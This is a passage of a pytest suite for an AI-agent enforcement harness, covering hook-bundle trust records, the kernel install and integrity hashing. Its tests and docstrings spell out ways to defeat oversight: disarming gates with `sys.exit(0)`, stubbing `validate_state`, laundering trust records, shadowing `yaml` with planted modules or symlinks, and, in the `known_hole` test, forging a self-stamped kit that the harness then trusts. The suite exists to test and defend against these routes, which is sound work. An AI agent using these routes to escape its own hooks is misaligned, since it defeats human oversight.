    # copy, so it arrived in `.claude/kernel` and was blessed with no stamp covering it.
    write(str(staging / "dev-team" / "hooks" / "yaml.pyc"), "planted\n")
    write(str(staging / "kernel" / "__pycache__" / "state.cpython-313.pyc"), "planted\n")
    write(str(staging / "kernel" / ".ruff_cache" / "evil.py"), "planted\n")
    repo = tmp_path / "repo"
    os.makedirs(str(repo / "project_memory"), exist_ok=True)
    subprocess.run(["git", "init", "-q", str(repo)], capture_output=True)
    write(str(repo / "project_memory" / "project_config.yaml"),
          "project:\n  name: kernel-delivery\n  preset: solo\nproviders: [claude]\n")
    env = dict(os.environ, USERPROFILE=str(tmp_path), HOME=str(tmp_path))
    os.makedirs(str(tmp_path / ".claude"), exist_ok=True)
    shutil.copytree(str(staging), str(tmp_path / ".claude" / "team-kits"), dirs_exist_ok=True)
    proc = subprocess.run(
        [powershell_or_skip(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
         str(tmp_path / ".claude" / "team-kits" / "scaffold_team.ps1"), "-Team", "dev-team"],
        cwd=str(repo), capture_output=True, text=True, env=env, timeout=600)
    # The scaffold rolls back on any failure, so an unfinished run looks exactly like a missing
    # kernel copy. Reporting the exit status first keeps the message about what actually went wrong
    # — a refused trust record reads as "the kernel was never installed" otherwise.
    assert proc.returncode == 0, ("the scaffold failed and rolled back\n%s\n%s"
                                  % (proc.stdout[-3000:], proc.stderr[-2000:]))
    installed = repo / ".claude" / "kernel" / "known_holes.json"
    assert installed.is_file(), (
        "the scaffold installed hooks but not the kernel they import\n%s\n%s"
        % (proc.stdout[-3000:], proc.stderr[-2000:]))
    # ...and the record `hook_trust` is measured against, written by the same run
    state = json.loads((repo / ".claude" / "kit_state.json").read_text(encoding="utf-8"))
    assert state["state"] == "restart_required"
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    assert state["hook_bundle_hash"] == hook_bundle_hash(str(repo / ".claude"))
    assert _bundle_bytecode(str(repo / ".claude")) == [], (
        "the scaffold carried planted bytecode into the enforcement bundle")
    assert not (repo / ".claude" / "kernel" / ".ruff_cache").exists(), (
        "the scaffold carried a planted tool cache into the enforcement bundle")


def test_the_scaffold_removes_a_hook_an_earlier_kit_left_behind(tmp_path):
    """THE OTHER HALF OF THE STRANGER REFUSAL, and without it the refusal would brick every update.

    `write_kit_state.py` now refuses to record trust when the enforcement layer holds importable
    code the kit did not ship. A hook DROPPED between releases is exactly that — `auto_dashboard.py`
    disappeared from two kits in the V2 monolith — and the copy loop only ever overwrote, never
    removed. So every project installed before such a release would have failed its next scaffold,
    at the recorder, after the files had already been replaced.

    The scaffold is the one actor that knows what it installed, which is why the prune belongs here
    and not in the recorder: a script whose job is to say whether an installation is trustworthy
    must not repair the installation to make its own answer come out yes.

    Re-stamped copy, same reason as above — and here the off-topic red was worse than off-topic: an
    unbumped VERSION rolled the scaffold back before the prune, and this test reported "the leftover
    hook survived the scaffold", which names a prune that never ran."""
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    os.makedirs(str(repo / "project_memory"), exist_ok=True)
    subprocess.run(["git", "init", "-q", str(repo)], capture_output=True)
    write(str(repo / "project_memory" / "project_config.yaml"),
          "project:\n  name: leftover\n  preset: solo\nproviders: [claude]\n")
    # the previous kit's hook, still in place — importable, and no longer shipped by anyone
    write(str(repo / ".claude" / "hooks" / "auto_dashboard.py"), "import os  # an older kit\n")
    env = dict(os.environ, USERPROFILE=str(tmp_path), HOME=str(tmp_path))
    os.makedirs(str(tmp_path / ".claude"), exist_ok=True)
    shutil.copytree(str(staging), str(tmp_path / ".claude" / "team-kits"), dirs_exist_ok=True)
    proc = subprocess.run(
        [powershell_or_skip(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
         str(tmp_path / ".claude" / "team-kits" / "scaffold_team.ps1"), "-Team", "dev-team"],
        cwd=str(repo), capture_output=True, text=True, env=env, timeout=600)
    assert not (repo / ".claude" / "hooks" / "auto_dashboard.py").exists(), (
        "the leftover hook survived the scaffold\n%s\n%s"
        % (proc.stdout[-3000:], proc.stderr[-2000:]))
    # ...and the run got all the way to a trust record, which is the thing the leftover blocked
    state = json.loads((repo / ".claude" / "kit_state.json").read_text(encoding="utf-8"))
    assert state["state"] == "restart_required", proc.stdout[-3000:]
    # ...while the hooks the kit DOES ship are still there — a prune that took the bundle with it
    # would satisfy the first assertion perfectly
    assert (repo / ".claude" / "hooks" / "gate_dispatch.py").is_file()


def test_the_posix_scaffold_prunes_unshipped_hooks_like_its_windows_twin():
    """The POSIX half cannot be executed on this runner and the Windows half is measured for real
    above, so the two are compared on the part that runs — COMMENTS STRIPPED, because the paragraph
    above this loop names `auto_dashboard.py` and `.claude/hooks` and would keep a grep green after
    the loop itself was deleted."""
    with open(os.path.join(TEAM_KITS, "scaffold_team.sh"), encoding="utf-8") as handle:
        code = "\n".join(line for line in handle.read().splitlines()
                         if not line.lstrip().startswith("#"))
    # `\n\s*done`, because this loop is INDENTED: anchoring at column 0 made the match run past its
    # own body to the next unindented `done` in the file, and the span only looked right for as
    # long as such a loop happened to follow. It stopped following on 2026-07-27.
    prune = re.search(r"(?s)for f in \"\$REPO\"/\.claude/hooks/\*(.*?)\n\s*done", code)
    assert prune, "scaffold_team.sh never iterates the INSTALLED hooks directory"
    body = prune.group(0)
    assert "$KIT/hooks/" in body, "the prune does not compare against what the kit ships: " + body
    assert re.search(r"(?m)^\s*rm -rf", body), "the prune removes nothing: " + body


@pytest.mark.parametrize("script", ["scaffold_team.ps1", "scaffold_team.sh"])
def test_both_scaffolds_manage_the_kernel_as_one_layer(script):
    """An enforcement layer that installs on one platform and not the other is the same defect with
    a smaller blast radius. So the two scripts are compared on the bookkeeping a half-failed
    scaffold depends on: the kernel has to be in the set the run backs up AND puts back, or a
    failed run leaves a project with new hooks and the previous kernel.

    WHAT THIS READS IS THE SET, and since 2026-09-01 the set is DATA in both twins (`RESTORABLE` /
    `$restorable`): the backup pass, the snapshot's own RESTORE_SET manifest and the restore
    routine are three consumers of that one declaration, so membership in it is the whole property.
    The RUNTIME half -- both twins really executed, the manifest they wrote compared entry by entry
    -- is `tools/test_kitupdate.py::test_both_installer_twins_record_the_same_restore_set`, which
    is where the claim "the .sh and .ps1 agree" is actually measured rather than read."""
    with open(os.path.join(TEAM_KITS, script), encoding="utf-8") as handle:
        body = handle.read().replace("\\", "/")
    # COMMENTS STRIPPED FIRST. The predecessor of this test grepped the raw file for
    # `.claude/kernel`, and the explanatory comment above the copy block contains that string — so
    # removing the copy itself left it green. Whatever a check reads must be the part that runs.
    code = "\n".join(ln for ln in body.splitlines() if not ln.lstrip().startswith("#"))
    assert ".claude/kernel" in code, "%s never names .claude/kernel in code" % script
    assert re.search(r"(?mi)^\s*(?:cp -R|Copy-Item)\s", code), (
        "%s has no copy statement at all" % script)
    declaration = re.search(r"(?is)(?:RESTORABLE=\(|\$restorable\s*=\s*@\()(.*?)\)", code)
    assert declaration, "%s declares no restore set" % script
    assert ".claude/kernel" in declaration.group(1), (
        "%s does not back up and put back .claude/kernel" % script)


def test_the_installed_kernel_carries_the_known_holes_sidecar(tmp_path):
    """BUG-6's delivery half. The enumeration only governs where it can be READ, and a project
    reads it from the kernel the scaffold installed — so it has to arrive with it."""
    repo = tmp_path / "repo"
    _scaffolded_bundle(repo)
    assert os.path.isfile(str(repo / ".claude" / "kernel" / "known_holes.json"))
    probe = ("import sys; sys.path.insert(0, %r); from kernel import report; "
             "print(report._known_hole_capabilities()[1])" % str(repo / ".claude"))
    out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True)
    assert out.stdout.strip() == "sidecar", out.stdout + out.stderr


def test_the_installed_kernel_is_not_agent_writable(tmp_path):
    """Installing the kernel into the project puts the single most enforcement-critical code in
    the repo inside ordinary writing territory. An agent that could Write `.claude/kernel/` would
    not need to touch a single gate: `report.validate_state` returning `[]` clears every block at
    once, and `approvals.mint` is right next to it."""
    repo = tmp_path / "repo"
    os.makedirs(str(repo / ".claude" / "kernel"), exist_ok=True)
    write(str(repo / ".claude" / "kernel" / "report.py"), "# real\n")
    payload = {"tool_name": "Write",
               "tool_input": {"file_path": str(repo / ".claude" / "kernel" / "report.py"),
                              "content": "def validate_state(*a, **k):\n    return []\n"},
               "cwd": str(repo)}
    assert run_hook("guard_harness_selfmod.py", payload, repo).returncode == 2


def test_trust_cannot_be_reset_by_re_running_the_recorder(tmp_path):
    """Measured as a working bypass: tamper with a hook, watch the next session drop to
    `hooks_trust_required`, re-run `write_kit_state.py` — an ordinary shell command — and the
    tampered bundle is `restart_required`, then `active` on the following start. No user, no
    `/hooks`, no confirmation, which is exactly what spec II.8 requires for a changed bundle.

    Running the real SCAFFOLD is safe by comparison: it re-copies the kit files and so undoes the
    tampering it would otherwise bless. The recorder now inherits that by refusing any bundle that
    is not the kit's.

    THE RECORDER UNDER TEST IS THE ONE THE BUNDLE CAME FROM. It used to be the real `team-kits/`
    one while the bundle came from a re-stamped copy, and the two disagreeing about the stamp made
    this test refuse for the wrong reason: with any kit file edited and not bumped it failed on
    "the kit source has been edited since it was stamped" — an rc 1 that is not the refusal this
    test is about, reached before the bundle was ever compared. The anti-laundering property then
    went unmeasured while the suite showed one red about VERSION stamps."""
    repo = tmp_path / "repo"
    hooks = _scaffolded_bundle(repo)
    recorder_kits = _restamped_staging(tmp_path)
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "active"
    write(os.path.join(hooks, "guard_harness_selfmod.py"), "import sys\nsys.exit(0)\n")
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "hooks_trust_required"
    proc = _record_trust(recorder_kits, repo)
    assert proc.returncode == 1, proc.stdout + proc.stderr
    assert "not the 'dev-team' kit's" in proc.stderr
    assert _kit_state(repo)["state"] == "hooks_trust_required", "the reset must not have happened"
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "hooks_trust_required"
    # ...and NOT by naming a different source. A `--kit-root` flag lived here for one round and
    # was the second laundering route in a row: `--kit . --kit-root <repo>/.claude` compared the
    # installed bundle against ITSELF and returned rc 0 over two gates replaced by `sys.exit(0)`.
    # The source is now this script's own directory and the kit name is a NAME, so every one of
    # these has to be refused — including the shapes that only became reachable via the flag.
    for extra in (["--kit-root", str(tmp_path)],          # the flag itself must be gone
                  ["--kit", "."],                          # ...and the paths it made reachable
                  ["--kit", ""],
                  ["--kit", "hooks/.."],
                  ["--kit", str(repo / ".claude")],
                  ["--kit", "../dev-team"],
                  ["--kit", "no-such-kit"]):
        argv = [sys.executable, str(recorder_kits / "write_kit_state.py"),
                "--repo", str(repo), "--kit", "dev-team"] + extra
        bypass = subprocess.run(argv, capture_output=True, text=True)
        assert bypass.returncode != 0, (extra, bypass.stdout + bypass.stderr)
        assert _kit_state(repo)["state"] == "hooks_trust_required", extra
    # ...and now the PROPERTY rather than the shape of the last fix. Each round's regression test
    # asserted the argument form that had just been closed, and each following round walked around
    # it with a perfectly ordinary argument. These two are the routes that needed no flag at all:
    # an empty directory with a legal kit name, and an unstamped mirror of the tampered bundle.
    staging = tmp_path / "staging"
    _copy_kit_tree(TEAM_KITS, staging)
    os.makedirs(str(staging / "x" / "hooks"), exist_ok=True)
    mirror = staging / "mirrored"
    os.makedirs(str(mirror), exist_ok=True)
    shutil.copytree(hooks, str(mirror / "hooks"))
    for kit in ("x", "mirrored"):
        forged = subprocess.run(
            [sys.executable, str(staging / "write_kit_state.py"),
             "--repo", str(repo), "--kit", kit], capture_output=True, text=True)
        assert forged.returncode != 0, (kit, forged.stdout + forged.stderr)
        assert "VERSION" in forged.stderr, (kit, forged.stderr)
        assert _kit_state(repo)["state"] == "hooks_trust_required", kit


@pytest.mark.known_hole("hook_trust")
def test_an_agent_that_can_run_scripts_can_still_forge_a_trust_record(tmp_path):
    """THE RESIDUAL, asserted rather than promised away. Three rounds of review each closed one
    laundering route and each found the next: re-running the recorder, `--kit-root`, and a copy of
    the recorder beside an authored kit tree. The stamp check closes every careless and every
    cheap route — an empty `x/hooks`, an unstamped mirror, an edited kit — but not this one: the
    stamp is computed by public code, so whoever can run a script can regenerate it.

    That is not a fixable property at this layer. It rests on `state_write_protection.shell`,
    which is itself a declared hole: an agent that cannot run arbitrary scripts cannot do any of
    this, and one that can does not need a trust record to begin with. So `hook_trust` is declared
    here, `python scripts/harness.py doctor` reports it `unverified`, and the report stops claiming a guarantee the
    harness cannot make. INVERT THIS TEST the day shell writes are actually contained."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import kit_hash
    repo = tmp_path / "repo"
    hooks = _scaffolded_bundle(repo)
    _run_trust_hook(repo)
    write(os.path.join(hooks, "gate_dispatch.py"), "import sys\nsys.exit(0)\n")   # veto disarmed
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "hooks_trust_required"
    # the forgery: an authored staging that mirrors the TAMPERED bundle, stamped to match itself
    evil = tmp_path / "evil"
    os.makedirs(str(evil / "dev-team"), exist_ok=True)
    shutil.copyfile(os.path.join(TEAM_KITS, "write_kit_state.py"),
                    str(evil / "write_kit_state.py"))
    _copy_kit_tree(os.path.join(TEAM_KITS, "kernel"), evil / "kernel")
    shutil.copytree(hooks, str(evil / "dev-team" / "hooks"))
    (evil / "dev-team" / "VERSION").write_text("version: 9999.99.99-1\ncontent: placeholder\n",
                                               encoding="utf-8")
    (evil / "dev-team" / "VERSION").write_text(
        "version: 9999.99.99-1\ncontent: %s\n" % kit_hash(str(evil / "dev-team")),
        encoding="utf-8")
    forged = subprocess.run(
        [sys.executable, str(evil / "write_kit_state.py"), "--repo", str(repo),
         "--kit", "dev-team"], capture_output=True, text=True)
    assert forged.returncode == 0, forged.stderr
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "active", "the residual this test documents is gone"
    from kernel import report
    trusted, _why = report._hook_bundle_trust(str(repo))
    assert trusted is True, "…and doctor believes it, which is why hook_trust is a known_hole"


def _record_with_one_stranger(tmp_path, relative, content="X = 1\n"):
    """Install a bundle from a self-stamped staging, plant one foreign path, re-record trust.

    `relative` is under `.claude`, because the import path is wider than the bundle: `hooks/…` for
    the directory `GATE_PREAMBLE` puts at `sys.path[0]`, a bare name for `.claude` itself, which
    `_kernel.import_kernel` puts there while `kernel.state` runs its module-scope `import yaml`.
    """
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    write(str(repo / ".claude" / relative.replace("/", os.sep)), content)
    return _record_trust(staging, repo)


@pytest.mark.parametrize("relative", [
    "hooks/yaml.py",              # the plain shadow
    "hooks/yaml/__init__.py",     # ...as a package, which a flat scan cannot see
    "hooks/yaml.pyc",             # ...sourceless, which the hash used to skip as well
    "yaml.py",                    # `.claude` ITSELF, which is on the path and in no subtree
])
def test_a_stranger_that_would_import_is_refused(tmp_path, relative):
    """THE CHEAPEST ATTACK IN THE REPO, until this refused: write one file, run the recorder, and a
    SessionStart later the bundle is `active` with the intruder hashed INTO it. It cost less than
    the residual `hook_trust` declares as a `known_hole`, which at least demands a self-stamped
    staging — and the `.claude/yaml.py` form cost even less than the others, because it produced no
    warning line at all (the bundle hash does not cover that directory, so it was not even a
    stranger). Measured before the fix: rc 0 and `state: restart_required` for all four.

    Each of these owns the name `yaml` for every gate process, and `kernel.state` imports it at
    module scope, so the winner parses the state files every gate decides on."""
    proc = _record_with_one_stranger(tmp_path, relative)
    assert proc.returncode == 1, proc.stdout + proc.stderr
    assert relative in proc.stderr.replace("\\", "/"), proc.stderr
    assert "refusing to record trust" in proc.stderr


def test_a_stranger_that_cannot_import_is_named_and_not_refused(tmp_path):
    """THE BOUNDARY, so that what is tested is the rule and not a spelling. A foreign file the
    import machinery would never load is the ordinary case — an older kit's data file the scaffold
    never pruned — and turning that into a hard refusal would make re-scaffolding impossible for a
    reason that is only untidiness. It is still named, because recording trust rewrites the bundle
    hash around it and `hook_trust` will not mention it afterwards."""
    proc = _record_with_one_stranger(tmp_path, "hooks/notes.txt", "read me\n")
    assert proc.returncode == 0, proc.stderr
    assert "hooks/notes.txt" in proc.stderr.replace("\\", "/"), proc.stderr
    assert "refusing" not in proc.stderr, proc.stderr


def test_importability_is_the_interpreters_own_answer(tmp_path):
    """A DEFINITION, NOT A LIST OF EXTENSIONS — and this test is what makes the difference bite.

    The order that produced the fix said "`.py`, `.pyc`, package directories", which is an
    enumeration, and the two halves it gets wrong are both here. An EXTENSION MODULE (`.pyd` on
    Windows, `.so` on POSIX, whichever `importlib.machinery.EXTENSION_SUFFIXES` names on the host
    running this) executes native code on import and would have been waved through. A `.pyo` has
    not been importable since Python 3.5, so refusing an install over one would be a false alarm —
    it is a stranger, and only that.

    Both cases are derived from the machinery here rather than written down, so this test asks the
    same question the code does: it cannot agree with a hand-written list by accident."""
    import importlib.machinery
    native = _record_with_one_stranger(
        tmp_path / "native", "hooks/yaml" + importlib.machinery.EXTENSION_SUFFIXES[0], "\x00\n")
    assert native.returncode == 1, native.stdout + native.stderr
    assert "refusing to record trust" in native.stderr
    stale = _record_with_one_stranger(tmp_path / "stale", "hooks/yaml.pyo", "junk\n")
    assert stale.returncode == 0, stale.stderr
    assert "hooks/yaml.pyo" in stale.stderr.replace("\\", "/"), stale.stderr


def test_a_stranger_that_is_a_link_to_a_package_is_refused(tmp_path):
    """The shape the measurement names instead of reading, asserted rather than assumed.

    A directory symlink contributes `hooks/yaml/<symlink>` to the stranger list — a name with no
    file behind it — so the refusal only holds if the importability question is asked of the LINK
    (`_installed_path` strips the marker, `resolves_to_module` follows it). Get that wrong and the
    stranger with the widest reach of all is the one waved through: `hooks/yaml -> <elsewhere>`
    owns the parser of every gate process exactly as `hooks/yaml/` does, and until 2026-07-27 it
    also left the bundle hash untouched.

    Deliberately a link to a package rather than to a single file: the two answers must come from
    the same question ("would an import load code from here"), and only the directory case can
    prove the marker is stripped."""
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    target = tmp_path / "elsewhere"
    write(str(target / "__init__.py"), "SHADOWED = True\n")
    try:
        os.symlink(str(target), str(repo / ".claude" / "hooks" / "yaml"),
                   target_is_directory=True)
    except (OSError, NotImplementedError) as exc:
        pytest.skip("no privilege to create a directory symlink (%s)" % exc)
    proc = _record_trust(staging, repo)
    assert proc.returncode == 1, proc.stdout + proc.stderr
    assert "refusing to record trust" in proc.stderr, proc.stderr
    assert "hooks/yaml" in proc.stderr.replace("\\", "/"), proc.stderr


@pytest.mark.skipif(os.name != "nt", reason="junctions are a Windows reparse point")
def test_a_junction_is_measured_by_its_contents_not_by_a_marker(tmp_path):
    """The fact two docstrings and one `pytest.skip` message now rest on, measured instead of
    assumed. `mklink /J` needs no privilege, and `os.path.islink` is False for what it creates —
    so `os.walk` descends and the linked files are hashed under their apparent names. That is why
    a junction is HARMLESS where a symlink is not (the payload is inside the hash either way) and
    why it cannot stand in for one in a drift test: both implementations descend, so both agree
    even while they disagree about symlinks."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import _bundle_files
    hooks = tmp_path / "hooks"
    target = tmp_path / "elsewhere"
    write(str(target / "__init__.py"), "SHADOWED = True\n")
    os.makedirs(str(hooks), exist_ok=True)
    made = subprocess.run(["cmd", "/c", "mklink", "/J", str(hooks / "yaml"), str(target)],
                          capture_output=True)
    assert made.returncode == 0, made.stdout + made.stderr
    assert not os.path.islink(str(hooks / "yaml"))
    assert [rel for rel, _ in _bundle_files(str(hooks), False)] == ["yaml/__init__.py"]


def test_the_import_path_scan_of_dot_claude_stops_at_what_would_load(tmp_path):
    """The `.claude` half must not cry wolf, or the first real scaffold would be unable to record.

    That directory is shared with the provider and the project — role files, skills, the scaffold's
    own timestamped backups of a previous install, which DO contain `.py` files further down. None
    of it is importable from `.claude`: `import agents` finds a namespace package with no module in
    it, and `backups.<timestamp>` is not even a name Python can spell. A package planted directly
    there is a different matter, and it is the shape the file form would take if only files were
    checked.

    So both directions in one test: everything a real installation carries passes, and one
    `yaml/__init__.py` beside it does not."""
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    claude = repo / ".claude"
    write(str(claude / "agents" / "backend-developer.md"), "---\n")
    write(str(claude / "skills" / "project-manager" / "SKILL.md"), "# skill\n")
    write(str(claude / "team_kit_roles.txt"), "backend-developer\n")
    write(str(claude / "backups" / "20260727-1200" / ".claude" / "hooks" / "gate_x.py"), "# old\n")
    clean = _record_trust(staging, repo)
    assert clean.returncode == 0, clean.stdout + clean.stderr
    assert "refusing" not in clean.stderr, clean.stderr

    write(str(claude / "yaml" / "__init__.py"), "def safe_load(_):\n    return {}\n")
    planted = _record_trust(staging, repo)
    assert planted.returncode == 1, planted.stdout + planted.stderr
    assert "yaml" in planted.stderr


def test_a_directory_symlink_into_the_bundle_is_refused_like_a_planted_package(tmp_path):
    """The link form of the same shadow, and the reason the stranger scan may not stop at the
    marker it reports. `_bundle_files` names a directory link `hooks/yaml/<symlink>` and refuses to
    descend — correct for a HASH, which must not follow a link to wherever it points — but an
    IMPORT does follow it, so the question "would this load" has to be asked of the link's target.
    `hooks/yaml -> <a package elsewhere>` shadows PyYAML exactly as `hooks/yaml/` does."""
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    target = tmp_path / "elsewhere"
    write(str(target / "__init__.py"), "def safe_load(_):\n    return {}\n")
    try:
        os.symlink(str(target), str(repo / ".claude" / "hooks" / "yaml"),
                   target_is_directory=True)
    except (OSError, NotImplementedError) as exc:
        pytest.skip("no privilege to create a directory symlink (%s)" % exc)
    proc = _record_trust(staging, repo)
    assert proc.returncode == 1, proc.stdout + proc.stderr
    assert "hooks/yaml" in proc.stderr.replace("\\", "/"), proc.stderr


def test_the_trust_hook_invents_nothing_without_a_record(tmp_path):
    """Absence of a record is not a record. A project that never ran the scaffold must not end up
    with the same `kit_state.json` as one that did — that file is the only thing separating "this
    bundle was installed and reviewed" from "some hooks exist in a directory"."""
    repo = tmp_path / "repo"
    os.makedirs(str(repo / ".claude" / "hooks"), exist_ok=True)
    write(str(repo / ".claude" / "hooks" / "gate_x.py"), "# gate\n")
    proc = _run_trust_hook(repo)
    assert proc.returncode == 0, proc.stderr
    assert not os.path.exists(str(repo / ".claude" / "kit_state.json"))


def test_the_trust_hook_never_refuses_a_session(tmp_path):
    """A comfort hook (spec II.4). It imports `_kernel`, whose excepthook turns any escaping error
    into exit 2 — correct for an integrity gate, fatal here: a briefing hook that kills the
    session over a malformed JSON file is worse than the problem it reports."""
    repo = tmp_path / "repo"
    _scaffolded_bundle(repo)
    write(str(repo / ".claude" / "kit_state.json"), "{ this is not json")
    assert _run_trust_hook(repo).returncode == 0
    write(str(repo / ".claude" / "kit_state.json"), "[]")
    assert _run_trust_hook(repo).returncode == 0
    os.remove(str(repo / ".claude" / "kit_state.json"))
    assert _run_trust_hook(repo).returncode == 0


def _adversarial_bundle(root):
    """A hook directory with everything the two hashes could disagree about.

    A DIRECTORY SYMLINK IS ONE OF THOSE THINGS, and its absence here is how the drift this fixture
    exists to catch got through a whole release: the canonical hash learned to name a link instead
    of walking past it, the inline Codex verifier — which is the ENFORCED measurement on that
    provider — kept the old blind `os.walk`, and the pin test stayed green because no test in the
    repo ever put a link in a bundle.

    A junction is not a substitute: `os.path.islink` is False for one, so both implementations
    descend into it and agree even while they disagree about symlinks (measured 2026-07-27). Where
    real symlinks need a privilege nobody granted, the whole question is unaskable, and the tests
    say `skipped` rather than passing on a tree that cannot express it.
    """
    os.makedirs(os.path.join(root, "sub", "deeper"), exist_ok=True)
    os.makedirs(os.path.join(root, "__pycache__"), exist_ok=True)
    write(os.path.join(root, "gate_a.py"), "print(1)\n")
    write(os.path.join(root, "allowlist.json"), '{"allow": ["x"]}\n')   # not a .py
    write(os.path.join(root, "notes.txt"), "read me\n")
    write(os.path.join(root, "sub", "helper.py"), "X = 1\n")            # nested
    write(os.path.join(root, "sub", "deeper", "z.py"), "Z = 2\n")
    write(os.path.join(root, "__pycache__", "gate_a.cpython-312.pyc"), "junk\n")
    write(os.path.join(root, "gate_a.pyc"), "junk\n")
    # OUTSIDE the bundle, so what the link contributes can only come from the link itself
    target = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(root))), "linked_pkg")
    write(os.path.join(target, "__init__.py"), "SHADOWED = True\n")
    link = os.path.join(root, "yaml")
    try:
        os.symlink(target, link, target_is_directory=True)
    except (OSError, NotImplementedError) as exc:
        pytest.skip("no privilege to create a directory symlink (%s); a junction cannot stand in, "
                    "because os.path.islink() is False for one and both hashes then agree" % exc)
    return link


def _remove_link(path):
    """Delete a directory symlink on either platform.

    `os.unlink` is the POSIX answer and raises PermissionError on a Windows directory link, where
    `os.rmdir` is the one that works — and `os.rmdir` is wrong on POSIX (ENOTDIR).
    """
    try:
        os.unlink(path)
    except OSError:
        os.rmdir(path)


def test_the_bundle_hash_has_exactly_one_definition(tmp_path):
    """BUG-10. Two implementations hashed ONE directory and disagreed: doctor took top-level
    `*.py` with name+content concatenated, the Codex generator walked the tree with NUL-separated
    relative paths. So `hook_trust` compared doctor's number against the number the Codex trust
    binding had recorded — two measurements of different things, which could only ever mismatch.
    The generator's definition won (it is the enforced one) and now lives in one place."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    repo = tmp_path / "repo"
    hooks = repo / ".claude" / "hooks"
    link = _adversarial_bundle(str(hooks))
    sys.path.insert(0, TEAM_KITS)
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "gpa_probe", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    gpa = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gpa)
    claude = str(repo / ".claude")
    # ...with one deliberate exception, and it is not a disagreement about the ALGORITHM. The
    # generator refuses a bundle containing any reparse point outright (`assert_tree_no_reparse`),
    # because the artifacts it is about to write bind trust to a tree whose hashed and executed
    # bytes could then diverge. So a legitimate directory link does not yield Codex hooks that
    # reject an unchanged bundle — it yields no Codex hooks and a readable message.
    with pytest.raises(SystemExit):
        gpa.hook_bundle_hash(str(repo))
    _remove_link(link)
    assert gpa.hook_bundle_hash(str(repo)) == hook_bundle_hash(claude)
    from kernel.report import _hook_bundle_hash
    assert _hook_bundle_hash(str(repo)) == hook_bundle_hash(claude)
    # the kernel is part of the bundle, not scenery beside it: rewriting the code every gate
    # imports must change the hash, or `hook_trust: verified` would cover the gates and not the
    # decisions they delegate
    before = hook_bundle_hash(claude)
    os.makedirs(os.path.join(claude, "kernel"), exist_ok=True)
    write(os.path.join(claude, "kernel", "report.py"), "def validate_state(*a):\n    return []\n")
    assert hook_bundle_hash(claude) != before


def test_the_inline_codex_verifier_agrees_with_the_canonical_hash(tmp_path):
    """The one copy of the algorithm that cannot be removed: the verifier `gen_provider_artifacts`
    base64-embeds into every Codex hook command runs with no imports available, because its own
    bytes are what Codex hashes for trust. A copy that cannot be deleted has to be PINNED — if it
    drifts, every Codex hook refuses with "bundle changed" on a bundle that did not change, and
    the kit is dead on that provider. Run both over a tree built from the disagreements.

    IT DRIFTED, and this test did not see it. When the canonical hash learned to name a directory
    symlink instead of walking past it, the copy kept the blind `os.walk` for a whole release —
    green here the entire time, because `_adversarial_bundle` contained no link. It contains one
    now, and the last third of this test exercises the branch in both directions: agreeing on a
    tree that HAS a link, and noticing when the link is what changed."""
    import base64
    import importlib.util
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    spec = importlib.util.spec_from_file_location(
        "gpa_probe2", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    gpa = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gpa)
    claude = tmp_path / "repo" / ".claude"
    link = _adversarial_bundle(str(claude / "hooks"))
    os.makedirs(str(claude / "kernel"), exist_ok=True)
    write(str(claude / "kernel" / "report.py"), "def validate_state(*a):\n    return [1]\n")
    expected = hook_bundle_hash(str(claude))
    verifier = tmp_path / "verify.py"
    verifier.write_bytes(base64.b64decode(gpa.hook_bundle_verifier_b64()))

    def verify(against):
        return subprocess.run([sys.executable, "-B", str(verifier), str(claude), against],
                              capture_output=True, text=True)

    ok = verify(expected)
    assert ok.returncode == 0, ok.stderr
    # ...and it must still NOTICE a change, or agreeing would be worthless. Changed in the KERNEL
    # half — the half a hooks-only hash missed entirely, which is why the scope grew.
    write(str(claude / "kernel" / "report.py"), "def validate_state(*a):\n    return []\n")
    changed = verify(expected)
    assert changed.returncode == 2, changed.stdout + changed.stderr
    # THE SYMLINK BRANCH, asserted as a difference the verifier can see rather than as agreement on
    # a tree where the branch never runs: remove the link and the two must move together.
    expected = hook_bundle_hash(str(claude))
    assert verify(expected).returncode == 0
    _remove_link(link)
    stale = verify(expected)
    assert stale.returncode == 2, (
        "removing a directory symlink changed the canonical hash and the verifier did not "
        "notice — the copy is walking past links again: " + stale.stdout + stale.stderr)
    assert verify(hook_bundle_hash(str(claude))).returncode == 0


def test_the_inline_verifiers_scope_is_read_from_the_definition(tmp_path):
    """THE OTHER HALF OF THE COPY, and the half no fixture can pin: WHAT it measures.

    The algorithm above is pinned by running both over a tree full of disagreements, but that pin
    is only ever as wide as the tree — and `BUNDLE_SUBTREES` decides which directories exist in it
    at all. A subtree added to the definition and not to the hand-written list inside the verifier
    would be hashed by `python scripts/harness.py doctor` and ignored by the measurement Codex actually enforces,
    which is the R5-F2 shape exactly: the enforced side blind to something the canonical side sees,
    with every existing test green because the fixture predates the new directory.

    So the definition is moved here and the generator must follow it. It can: the copy cannot
    import while it RUNS, but `hook_bundle_verifier_b64` reads `BUNDLE_SUBTREES` while it WRITES.
    A verifier that spelled its own scope out fails the first assertion below."""
    import base64
    import importlib.util
